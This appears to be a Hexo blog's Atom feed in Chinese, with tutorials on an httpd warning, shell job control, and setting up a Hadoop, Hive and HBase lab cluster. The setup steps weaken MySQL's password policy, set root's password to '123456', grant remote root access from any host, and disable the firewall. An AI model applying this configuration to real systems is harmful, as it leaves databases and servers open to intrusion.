<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>浩翰Redamancy的博客</title>
  
  <subtitle>文质彬彬 然后君子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://plutoacharon.github.io/"/>
  <updated>2019-10-16T09:21:14.548Z</updated>
  <id>https://plutoacharon.github.io/</id>
  
  <author>
    <name>浩翰</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>解决httpd: Could not reliably determine the server&#39;s fully qualified domain name</title>
    <link href="https://plutoacharon.github.io/2019/10/16/%E8%A7%A3%E5%86%B3httpd-Could-not-reliably-determine-the-server-s-fully-qualified-domain-name/"/>
    <id>https://plutoacharon.github.io/2019/10/16/解决httpd-Could-not-reliably-determine-the-server-s-fully-qualified-domain-name/</id>
    <published>2019-10-16T09:20:51.000Z</published>
    <updated>2019-10-16T09:21:14.548Z</updated>
    
    <content type="html"><![CDATA[<p>修改<code>httpd.conf</code></p><p><code>vim /etc/httpd/conf/httpd.conf</code></p><p>将里面的 #ServerName localhost:80 注释去掉即可。</p><p>再执行 <code>systemclt restart httpd</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;修改&lt;code&gt;httpd.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vim /etc/httpd/conf/httpd.conf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;将里面的 #ServerName localhost:80 注释去掉即可。&lt;/p&gt;
&lt;p&gt;再执行 &lt;cod
      
    
    </summary>
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/categories/Liunx/"/>
    
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/tags/Liunx/"/>
    
  </entry>
  
  <entry>
    <title>Centos7 bg与fg命令</title>
    <link href="https://plutoacharon.github.io/2019/10/16/Centos7-bg%E4%B8%8Efg%E5%91%BD%E4%BB%A4/"/>
    <id>https://plutoacharon.github.io/2019/10/16/Centos7-bg与fg命令/</id>
    <published>2019-10-16T09:20:09.000Z</published>
    <updated>2019-10-16T09:20:26.519Z</updated>
    
    <content type="html"><![CDATA[<h2 id="fg-和-bg-命令"><a href="#fg-和-bg-命令" class="headerlink" title="fg 和 bg 命令"></a>fg 和 bg 命令</h2><p> 调度正在运行的任务</p><p> 假设你发现前台运行的一个程序需要很长的时间，但是需要干其他的事情，你就可以用 Ctrl-Z ，挂起这个程序，然后可以看到系统提示（方括号中的是作业号）：</p><p>这里拿<code>top</code>举个例子</p><p><code>[1]+  已停止               top</code></p><p>关于:</p><p><code>&amp;</code> </p><p>这个用在一个命令的最后，可以把这个命令放到后台执行</p><p><code>ctrl + z</code></p><p>可以将一个正在前台执行的命令放到后台，并且暂停</p><p><code>jobs</code></p><p>查看当前有多少在后台运行的命令</p><p><code>fg</code></p><p>将后台中的命令调至前台继续运行</p><p><code>bg</code></p><p>将一个在后台暂停的命令，变成继续执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># bg 1</span></span><br><span class="line">[1]+ top &amp;</span><br><span class="line">psoot@localhost ~]<span class="comment"># </span></span><br><span class="line">ps</span><br><span class="line">   PID TTY          TIME CMD</span><br><span class="line"> 10045 pts/2    00:00:00 bash</span><br><span class="line"> 11347 pts/2    00:00:00 top</span><br><span class="line"> 11356 pts/2    00:00:00 ps</span><br><span class="line"></span><br><span class="line">[1]+  已停止               top</span><br><span class="line">[root@localhost ~]<span class="comment"># kill -s 9 11347</span></span><br><span class="line">[root@localhost ~]<span class="comment"># ps</span></span><br><span class="line">   PID TTY          TIME CMD</span><br><span class="line"> 10045 pts/2    00:00:00 bash</span><br><span class="line"> 11357 pts/2    00:00:00 ps</span><br><span class="line">[1]+  已杀死               top</span><br><span class="line">[root@localhost ~]<span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;fg-和-bg-命令&quot;&gt;&lt;a href=&quot;#fg-和-bg-命令&quot; class=&quot;headerlink&quot; title=&quot;fg 和 bg 命令&quot;&gt;&lt;/a&gt;fg 和 bg 命令&lt;/h2&gt;&lt;p&gt; 调度正在运行的任务&lt;/p&gt;
&lt;p&gt; 假设你发现前台运行的一个程序需要很长的
      
    
    </summary>
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/categories/Liunx/"/>
    
    
      <category term="Liunx" scheme="https://plutoacharon.github.io/tags/Liunx/"/>
    
  </entry>
  
  <entry>
    <title>大数据环境准备-搭建数据仓库</title>
    <link href="https://plutoacharon.github.io/2019/10/14/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87-%E6%90%AD%E5%BB%BA%E6%95%B0%E6%8D%AE%E4%BB%93%E5%BA%93/"/>
    <id>https://plutoacharon.github.io/2019/10/14/大数据环境准备-搭建数据仓库/</id>
    <published>2019-10-14T10:48:58.000Z</published>
    <updated>2019-10-14T10:49:37.319Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>1.首先修改hosts文件，以自己实验ip为准。（master中进行）</p><p><code>vim /etc/hosts</code></p><p>然后直接将hosts文件复制到从节点中</p><pre><code>scp /etc/hosts root@slave1:/etc/hostsscp /etc/hosts root@slave2:/etc/hosts</code></pre><p>2.开启zookeeper（三台机器）</p><p>进入zookeeper安装目录，直接开启zookeeper。</p><pre><code>/usr/zookeeper/zookeeper-3.4.10/bin/zkServer.sh start/usr/zookeeper/zookeeper-3.4.10/bin/zkServer.sh status</code></pre><p>3.开启hadoop（master进行）<br><code>/usr/hadoop/hadoop-2.7.3/sbin/start-all.sh</code></p><p>hadoop集群开启之后，就可以在此基础上安装hive了</p><p>注意：</p><p>　　实验中我们选用hive的远程模式，slave2安装mysql-server用于存放元数据，slave1作为hive server作为thrift 服务器，master作为client客户端进行操作。<br>　　<br>Slave2上安装mysql-server</p><p>1.环境中，我们已经配置过本地源了。所以这里不用下载yum源，我们直接安装mysql server即可。</p><p>安装MySQL：<code>yum -y install mysql-community-server</code></p><p>2.启动服务</p><p>重载所有修改过的配置文件：<code>systemctl daemon-reload</code><br>开启服务：<code>systemctl start mysqld</code><br>开机自启：<code>systemctl enable mysqld</code></p><p>3.安装完毕后，MySQL会在/var/log/mysqld.log这个文件中会自动生成一个随机的密码，获取得这个随机密码，以用于登录MySQL数据库：</p><p>获取初密码：<code>grep &quot;temporary password&quot; /var/log/mysqld.log</code><br>登陆MySQL：<code>mysql -uroot -p</code>（注意中英文）</p><p>4.MySQL密码安全策略设置：</p><p>设置密码强度为低级：<code>set global validate_password_policy=0;</code><br>设置密码长度：<code>set global validate_password_length=4;</code><br>修改本地密码：<code>alter user &#39;root&#39;@&#39;localhost&#39; identified by &#39;123456&#39;;</code><br>退出：\q</p><p>密码强度分级如下：</p><pre><code>0为low级别，只检查长度；1为medium级别（默认），符合长度为8，且必须含有数字，大小写，特殊字符;2为strong级别，密码难度更大一些，需要包括字典文件。</code></pre><p>密码长度最低长为4，当设置长度为1、2、3时，其长度依然为4。</p><ol start="5"><li>设置远程登录</li></ol><p>以新密码登陆MySQL：<code>mysql -uroot -p123456</code><br>创建root用户：<code>create user &#39;root&#39;@&#39;%&#39; identified by &#39;123456&#39;;</code><br>添加远程登录用户：<code>grant all privileges on *.* to &#39;root&#39;@&#39;%&#39; with grant option;</code><br>刷新权限：<code>flush privileges;</code></p><p>master、slave1上创建工作路径，解压hive</p><p>1.首先我们需要创建工作路径，并将hive解压。环境中master作为客户端，slave1作为服务器端，因此都需要使用到hive。因为hive相关安装包存放在master中，因此我们先在master中对hive进行解压，然后将其复制到slave1中。</p><p>master中操作如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/soft</span><br><span class="line">ls</span><br><span class="line">mkdir -p /usr/hive</span><br><span class="line">tar -zxvf /opt/soft/apache-hive-2.1.1-bin.tar.gz -C /usr/hive/</span><br></pre></td></tr></table></figure><p>2.同样slave1上建立文件夹/usr/hive，master中将安装包远程复制到</p><p>slave1</p><p><code>scp -r /usr/hive/apache-hive-2.1.1-bin root@slave1:/usr/hive/</code></p><p>3.修改/etc/profile文件设置hive环境变量。（master和slave1都执行）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/profile</span><br><span class="line">#set hive</span><br><span class="line">export HIVE_HOME=/usr/hive/apache‐hive‐2.1.1‐bin</span><br><span class="line">export PATH=$PATH:$HIVE_HOME/bin</span><br></pre></td></tr></table></figure><p>生效环境变量：<br><code>source /etc/profile</code></p><p>slave1作为hive server，进行配置</p><p>1.因为服务器端需要和Mysql通信，所以服务器端需要Mysql的lib安装包到<code>Hive_Home/conf</code>目录下。</p><p>注意：mysql.jar放在slave2中的/lib目录下，需要将其远程复制到slave1的hive的lib中。</p><p>首先slave2中进行如下操作：</p><p>查看lib：<code>ls /lib</code></p><p>远程复制依赖包到slave1：<code>scp /lib/mysql-connector-java-5.1.5-bin.jar root@slave1:/usr/hive/apache-hive-2.1.1-bin/lib</code></p><p>2.回到slave1，修改hive-env.sh文件中HADOOP_HOME环境变量。进入hive配置目录，因为hive中已经给出配置文件的范本hive-env.sh.template，直接将其复制一个进行修改即可：</p><pre><code>cd $HIVE_HOME/conflscp hive-env.sh.template hive-env.shvim hive-env.sh</code></pre><p>hive-env.sh文件中修改HADOOP_HOME环境变量，内容如下：</p><p><code>HADOOP_HOME=/usr/hadoop/hadoop-2.7.3</code></p><p>3.修改hive-site.xml文件<br>　　<br><code>vim hive-site.xml</code></p><p>添加内容如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- Hive产生的元数据存放位置--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.warehouse.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/user/hive_remote/warehouse<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 数据库连接JDBC的URL地址--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionURL<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>jdbc:mysql://slave2:3306/hive?createDatabaseIfNotExist=true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 数据库连接driver，即MySQL驱动--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionDriverName<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>com.mysql.jdbc.Driver<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- MySQL数据库用户名--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionUserName<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>root<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- MySQL数据库密码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>javax.jdo.option.ConnectionPassword<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.schema.verification<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>datanucleus.schema.autoCreateAll<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>master作为客户端，进行配置</p><p>1.解决版本冲突和jar包依赖问题。</p><p>由于客户端需要和Hadoop通信，所以需要更改Hadoop中jline的版本。即保留一个高版本的jline jar包，从hive的lib包中拷贝到Hadoop中lib位置为<code>/usr/hadoop/hadoop-2.7.3/share/hadoop/yarn/lib</code><br><code>cp /usr/hive/apache-hive-2.1.1-bin/lib/jline-2.12.jar /usr/hadoop/hadoop-2.7.3/share/hadoop/yarn/lib/</code></p><p>2.修改hive-env.sh中HADOOP_HOME环境变量：</p><p><code>HADOOP_HOME=/usr/hadoop/hadoop‐2.7.3</code></p><p>3.修改hive-site.xml：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Hive产生的元数据存放位置--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.warehouse.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/user/hive_remote/warehouse<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--- 使用本地服务连接Hive,默认为true--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.local<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>false<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 连接服务器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>hive.metastore.uris<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>thrift://slave1:9083<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="启动hive"><a href="#启动hive" class="headerlink" title="启动hive"></a>启动hive</h3><p>1.slave1作为服务器端，开启hive server。</p><p><code>bin/hive --service metastore</code></p><p>2.master作为客户端，启动hive。</p><p><code>bin/hive</code></p><p>测试hive是否启动成功：</p><p><code>hive&gt;show databases;</code></p><p>3.最后复制一个master，查看其进程如下：</p><p>jps</p><h3 id="Hbase环境搭建"><a href="#Hbase环境搭建" class="headerlink" title="Hbase环境搭建"></a>Hbase环境搭建</h3><p>注意开启hbase之前，需要将之前的hadoop集群开启</p><p><code>start-all.sh</code> （启动hadoop）</p><p><code>zkServer.sh start</code>（各个节点均执行）</p><p>创建路径：mkdir -p /usr/hbase</p><p>解压缩：tar -zxvf /opt/soft/hbase-1.2.4-bin.tar.gz</p><p>添加环境变量：</p><p>在/etc/profile中添加</p><p>在三个节点中都要添加</p><pre><code>export  HBASE_HOME=/usr/hbase/hbase-1.2.4export  PATH=$HBASE_HOME/bin:$PATH</code></pre><p><code>source /etc/profile</code></p><p>修改配置文件：<code>conf/hbase-env.sh</code></p><pre><code>export HBASE_MANAGES_ZK=falsexport JAVA_HOME=/usr/java/jdk1.8.0_171</code></pre><p>解释：</p><p>一个分布式运行的Hbase依赖一个zookeeper集群。所有的节点和客户端都必须能够访问zookeeper。默认的情况下Hbase会管理一个zookeep集群，即Hbase默认自带一个zookeep集群。这个集群会随着Hbase的启动而启动。而在实际的商业项目中通常自己管理一个zookeeper集群更便于优化配置提高集群工作效率，但需要配置Hbase。需要修改conf/hbase-env.sh里面的HBASE_MANAGES_ZK 来切换。这个值默认是true的，作用是让Hbase启动的时候同时也启动zookeeper.在本实验中，我们采用独立运行zookeeper集群的方式，故将其属性值改为false。</p><p>3.配置<code>conf/hbase-site.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.rootdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://master:9000/hbase<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.cluster.distributed<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.master<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://master:6000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.quorum<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">value</span>&gt;</span>master,slave1,slave2<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.property.dataDir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">　　　　<span class="tag">&lt;<span class="name">value</span>&gt;</span>/usr/zookeeper/zookeeper-3.4.10/<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解释：要想运行完全分布式模式，加一个属性 hbase.cluster.distributed 设置为 true 然后把 hbase.rootdir 设置为HDFS的NameNode的位置</p><pre><code>　　hbase.rootdir：这个目录是region server的共享目录，用来持久化Hbase。URL需要是’完全正确’的，还要包含文件系统的scheme　　　　hbase.cluster.distributed ：Hbase的运行模式。false是单机模式，true是分布式模式。若为false,Hbase和Zookeeper会运行在同一个JVM里面。在hbase-site.xml配置zookeeper：当Hbase管理zookeeper的时候，你可以通过修改zoo.cfg来配置zookeeper，对于zookeepr的配置，你至少要在 hbase-site.xml中列出zookeepr的ensemble servers，具体的字段是 hbase.zookeeper.quorum.在这里列出Zookeeper集群的地址列表，用逗号分割。　　　　hbase.zookeeper.property.clientPort：ZooKeeper的zoo.conf中的配置,客户端连接的端口。　　　　hbase.zookeeper.property.dataDir：ZooKeeper的zoo.conf中的配置。对于独立的Zookeeper，要指明Zookeeper的host和端口。需要在 hbase-site.xml中设置。　　　　</code></pre><p>配置<code>conf/regionservers</code></p><pre><code>masterslave1slave2</code></pre><p>在这里列出了希望运行的全部 HRegionServer，一行写一个host (就Hadoop里面的 slaver 一样)。列在这里的server会随着集群的启动而启动，集群的停止而停止</p><p>分发hbase</p><p>运行hbase : <code>start-hbase.sh</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h2&gt;&lt;p&gt;1.首先修改hosts文件，以自己实验ip为准。（master中进行）&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vim /etc/host
      
    
    </summary>
    
      <category term="Hadoop" scheme="https://plutoacharon.github.io/categories/Hadoop/"/>
    
    
      <category term="Hadoop" scheme="https://plutoacharon.github.io/tags/Hadoop/"/>
    
  </entry>
  
  <entry>
    <title>大数据基础环境搭建</title>
    <link href="https://plutoacharon.github.io/2019/10/14/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://plutoacharon.github.io/2019/10/14/大数据基础环境搭建/</id>
    <published>2019-10-14T10:47:51.000Z</published>
    <updated>2019-10-14T10:48:40.626Z</updated>
    
    <content type="html"><![CDATA[<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境:"></a>实验环境:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Centos7 </span><br><span class="line">Xshell</span><br></pre></td></tr></table></figure><h2 id="安装包版本"><a href="#安装包版本" class="headerlink" title="安装包版本:"></a>安装包版本:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hadoop-2.7.3.tar.gz</span><br><span class="line">apache-hive-2.1.1-bin.tar</span><br><span class="line">hbase-1.2.4-bin.tar.gz</span><br><span class="line">jdk-8u171-linux-x64.tar.gz</span><br><span class="line">mysql-connector-java-5.1.47-bin.jar</span><br><span class="line">scala-2.11.12.tgz</span><br><span class="line">spark-2.4.0-bin-hadoop2.7.tgz</span><br><span class="line">zookeeper-3.4.10.tar.gz</span><br></pre></td></tr></table></figure><h2 id="基础环境搭建及Zookeeper搭建"><a href="#基础环境搭建及Zookeeper搭建" class="headerlink" title="基础环境搭建及Zookeeper搭建"></a>基础环境搭建及Zookeeper搭建</h2><h3 id="修改主机名"><a href="#修改主机名" class="headerlink" title="修改主机名"></a>修改主机名</h3><p>本次集群搭建共有三个节点，包括一个主节点master，和两个从节点slave1和slave2。具体操作如下 ： </p><p>1.以主机点master为例，首次切换到root用户：su<br>2.修改主机名为master：<br><code>hostnamectl set-hostname &lt;hostsname&gt;</code><br>3.永久修改主机名，编辑/etc/sysconfig/network文件，内容如下： </p><pre><code>NETWORKING=yes HOSTNAME=master </code></pre><p>保存该文件，重启计算机：reboot<br>查看是否生效：hostname </p><h3 id="配置hosts文件"><a href="#配置hosts文件" class="headerlink" title="配置hosts文件"></a>配置hosts文件</h3><p>使各个节点能使用对应的节点主机名连接对应的地址。<br>hosts文件主要用于确定每个结点的IP地址，方便后续各结点能快速查到并访问。在上述3个虚机结点上均需要配置此文件。由于需<br>要确定每个结点的IP地址，所以在配置hosts文件之前需要先查看当前虚机结点的IP地址是多少. </p><p>1.可以通过ifconfig命令进行查看<br>2.查看节点地址之后将三个节点的ip地址以及其对应的名称写进hosts文件。这里我们设置为<code>master、slave1、slave2</code>。注意保存退出。 </p><h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><p>centos7中防火墙命令用firewalld取代了iptables，当其状态是dead时，即防火墙关闭。 </p><pre><code>关闭防火墙：systemctl stop firewalld 查看状态：systemctl status firewalld </code></pre><h3 id="配置时间同步"><a href="#配置时间同步" class="headerlink" title="配置时间同步"></a>配置时间同步</h3><p><a href="https://blog.csdn.net/qq_43442524/article/details/102521986" target="_blank" rel="noopener">时间同步</a></p><h3 id="配置SSH免密码登陆"><a href="#配置SSH免密码登陆" class="headerlink" title="配置SSH免密码登陆"></a>配置SSH免密码登陆</h3><p>SSH主要通过RSA算法来产生公钥与私钥，在数据传输过程中对数据进行加密来保障数据的安全性和可<br>靠性，公钥部分是公共部分，网络上任一结点均可以访问，私钥主要用于对数据进行加密，以防他人盗取<br>数据。总而言之，这是一种非对称算法，想要破解还是非常有难度的。Hadoop集群的各个结点之间需要<br>进行数据的访问，被访问的结点对于访问用户结点的可靠性必须进行验证，hadoop采用的是ssh的方法通<br>过密钥验证及数据加解密的方式进行远程安全登录操作，当然，如果hadoop对每个结点的访问均需要进行<br>验证，其效率将会大大降低，所以才需要配置SSH免密码的方法直接远程连入被访问结点，这样将大大提<br>高访问效率。 </p><ol><li>每个结点分别产生公私密钥：<code>ssh-keygen -t dsa -P &#39;&#39; -f ~/.ssh/id_dsa</code>（三台机器）<br>秘钥产生目录在用户主目录下的.ssh目录中，进入相应目录查看：cd .ssh/ </li></ol><p>2.Id_dsa.pub为公钥，id_dsa为私钥，紧接着将公钥文件复制成authorized_keys文件：（仅master）<br><code>cat id_dsa.pub &gt;&gt; authorized_keys</code>（注意在.ssh/路径下操作） </p><ol start="3"><li><p>在主机上连接自己，也叫做ssh内回环。<br><code>ssh master</code></p></li><li><p>让主结点master能通过SSH免密码登录两个子结点slave。（slave中操作）<br>为了实现这个功能，两个slave结点的公钥文件中必须要包含主结点的公钥信息，这样当master就可以顺利安全地访问这两个slave结点了。 